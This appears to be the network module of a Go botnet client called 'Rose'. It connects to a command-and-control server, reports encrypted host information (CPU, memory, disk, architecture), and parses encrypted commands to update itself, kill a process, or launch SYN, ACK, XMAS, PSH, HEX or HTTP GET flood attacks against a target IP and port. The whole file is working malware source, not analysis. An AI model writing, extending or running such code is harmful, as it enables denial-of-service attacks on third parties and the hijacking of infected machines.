package network

import (
	"bot/lib/attack"
	"bot/lib/modules/update"
	"bot/lib/security"
	"bot/lib/utils"
	"bufio"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
)

var (
	Rose *Bot
)

func GetBot() *Bot {
	Rose = &Bot{
		Connected: false,
		Info:      Profile,
	}

	for {
		sock, err := net.Dial("tcp", fmt.Sprintf("%s:%d", utils.CncAddr, utils.CncPort))

		if err != nil {
			fmt.Println(err)
			time.Sleep(5 * time.Second)
			continue
		}

		utils.Debug(fmt.Sprintf("Socket initialized --> %s", sock.RemoteAddr()))

		// CPU|RAM|DISK|ARCH|VERSION|VECTOR
		_, err = sock.Write([]byte(security.EncryptStr(fmt.Sprintf("BOTINFO|%d|%d|%d|%s|%s|%s", Profile.Cpu, Profile.Mem, Profile.Disk, Profile.Arch, utils.BinVersion, os.Args[1]))))
		if err != nil {
			fmt.Println(err)
			time.Sleep(5 * time.Second)
			continue
		}

		Rose.Socket = sock
		Rose.Connected = true
		return Rose
	}
}

func (B *Bot) HandleSocket() {
	for B.Connected {
		data, err := bufio.NewReader(B.Socket).ReadString('\n')

		if err != nil {
			utils.Debug("Fatal: Error when recieve data")
			B.Connected = false
		}

		data = strings.ToUpper(strings.TrimSpace(security.DecryptStr(data)))
		if data == "" {
			continue
		}

		utils.Debug(fmt.Sprintf("Recv --> %s", data))
		if !strings.HasPrefix(data, "!") {
			continue
		}

		args := strings.Split(strings.Split(data, "!")[1], " ")

		if args[0] == "UPDATE" {
			go update.CheckForUpdate()
		}

		if args[0] == "KILLDS" {
			go security.Kill()
		}

		// ddos method ip port time thread power lenght
		if args[0] == "DDOS" && len(args) == 8 {
			var m attack.Method

			length, err := strconv.Atoi(args[7])
			if err != nil {
				return
			}

			switch args[1] {
			case "HEX":
				m = attack.HEX(length)
			case "PSH":
				m = attack.PSH(length)
			case "SYN":
				m = attack.SYN(length)
			case "ACK":
				m = attack.ACK(length)
			case "XMAS":
				m = attack.XMAS(length)
			case "HTTPGET":
				m = attack.HTTPGET(length)
			}

			port, err := strconv.Atoi(args[3])
			if utils.HandleError(err) {
				continue
			}

			time, err := strconv.Atoi(args[4])
			if utils.HandleError(err) {
				continue
			}

			thread, err := strconv.Atoi(args[5])
			if utils.HandleError(err) {
				continue
			}

			power, err := strconv.Atoi(args[6])
			if utils.HandleError(err) {
				continue
			}

			a := attack.NewAttack(args[2], port, thread, power, m, time)
			go a.Run()
		}
	}
}

func (B *Bot) Report(Content string) {
	for {
		for !B.Connected {
			time.Sleep(3 * time.Second)
			continue
		}

		_, Err := B.Socket.Write([]byte(security.EncryptStr(fmt.Sprintf("%s", Content))))
		if !utils.HandleError(Err) {
			break
		}
	}
}

func CncSocket() {
	for {
		Rose = GetBot()
		Rose.HandleSocket()
	}
}
